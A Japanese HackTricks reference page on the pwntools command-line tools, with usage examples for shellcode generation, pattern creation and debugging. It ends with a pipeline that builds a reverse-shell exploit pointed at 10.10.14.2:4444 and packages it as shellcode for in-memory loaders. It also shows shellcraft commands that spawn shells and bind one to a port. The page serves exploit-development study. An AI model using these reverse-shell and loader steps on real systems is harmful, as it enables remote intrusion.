# PwnTools

{{#include ../../../banners/hacktricks-training.md}}
```
pip3 install pwntools
```
## Pwn asm

行またはファイルから **opcodes** を取得する。
```
pwn asm "jmp esp"
pwn asm -i <filepath>
```
**選択可能:**

- 出力タイプ (raw,hex,string,elf)
- 出力ファイルのコンテキスト (16,32,64,linux,windows...)
- 除外するバイト (new lines, null, a list)
- エンコーダを選択し、gdbを使用してshellcodeをデバッグし、出力を実行

## **Pwn checksec**

Checksecのスクリプト
```
pwn checksec <executable>
```
## Pwn constgrep

## Pwn cyclic

パターンを取得する
```
pwn cyclic 3000
pwn cyclic -l faad
```
**選択可能:**

- 使用するアルファベット（デフォルトは小文字）
- uniq パターンの長さ（デフォルト 4）
- context（16,32,64,linux,windows...）
- オフセットを取得する（-l）

## Pwn debug

プロセスにGDBをアタッチする
```
pwn debug --exec /bin/bash
pwn debug --pid 1234
pwn debug --process bash
```
**選択可能：**

- 実行ファイル、名前、または pid コンテキストごとに選択可能（16,32,64,linux,windows...）
- 実行する gdbscript を指定
- sysrootpath を指定

## Pwn disablenx

バイナリの nx を無効化する
```
pwn disablenx <filepath>
```
## Pwn disasm

hex opcodes を逆アセンブルする
```
pwn disasm ffe4
```
**選択可能:**

- context (16,32,64,linux,windows...)
- base addres
- color(default)/no color

## Pwn elfdiff

2つのファイルの差分を表示する
```
pwn elfdiff <file1> <file2>
```
## Pwn hex

16進数表現を取得する
```bash
pwn hex hola #Get hex of "hola" ascii
```
## Pwn phd

hexdumpを取得
```
pwn phd <file>
```
**選択可能:**

- 表示するバイト数
- 1行あたりのバイト数（ハイライト用）
- 先頭からスキップするバイト数

## Pwn pwnstrip

## Pwn scrable

## Pwn shellcraft

shellcodes を取得
```
pwn shellcraft -l #List shellcodes
pwn shellcraft -l amd #Shellcode with amd in the name
pwn shellcraft -f hex amd64.linux.sh #Create in C and run
pwn shellcraft -r amd64.linux.sh #Run to test. Get shell
pwn shellcraft .r amd64.linux.bindsh 9095 #Bind SH to port
```
**選択可能:**

- shellcode と shellcode の引数
- 出力ファイル
- 出力形式
- debug（shellcode に dbg をアタッチ）
- before（コード前のデバッグトラップ）
- after
- opcodes を使わない（デフォルト: null と改行を避ける）
- shellcode を実行
- カラー / ノンカラー
- syscalls を一覧表示
- 利用可能な shellcodes を一覧表示
- ELF を共有ライブラリとして生成

## Pwn template

python テンプレートを取得
```
pwn template
```
**選択可能:** host, port, user, pass, path and quiet

## Pwn unhex

hex から string に変換
```
pwn unhex 686f6c61
```
## Pwnの更新

pwntoolsを更新するには
```
pwn update
```
## ELF → raw shellcode packaging (loader_append)

Pwntools はスタンドアロンの ELF を単一の raw shellcode ブロブに変換し、そのセグメントを自己マップして元の entrypoint に実行を移すことができます。これは、メモリのみのローダー（例: Android アプリが JNI を呼び出してダウンロードしたバイトを実行する場合）に最適です。

Typical pipeline (amd64 example)

1) static かつ position‑independent な payload ELF をビルドする（移植性のため musl 推奨）：
```bash
musl-gcc -O3 -s -static -o exploit exploit.c \
-DREV_SHELL_IP="\"10.10.14.2\"" -DREV_SHELL_PORT="\"4444\""
```
2) ELF を shellcode に pwntools で変換する:
```python
# exp2sc.py
from pwn import *
context.clear(arch='amd64')
elf = ELF('./exploit')
sc = asm(shellcraft.loader_append(elf.data, arch='amd64'))
open('sc','wb').write(sc)
print(f"ELF size={len(elf.data)} bytes, shellcode size={len(sc)} bytes")
```
3) sc をメモリローダー（例：HTTP[S] 経由）に届け、プロセス内で実行する。

Notes
- loader_append は元の ELF プログラムを shellcode に埋め込み、セグメントを mmaps してエントリにジャンプする小さなローダーを生成する。
- context.clear(arch=...) でアーキテクチャを明示すること。arm64 は Android で一般的。
- ペイロードのコードは position‑independent に保ち、プロセスの ASLR/NX に関する前提を避けること。

## References

- [Pwntools](https://docs.pwntools.com/en/stable/)
- [CoRPhone – ELF→shellcode pipeline used for Android in-memory execution](https://github.com/0xdevil/corphone)

{{#include ../../../banners/hacktricks-training.md}}
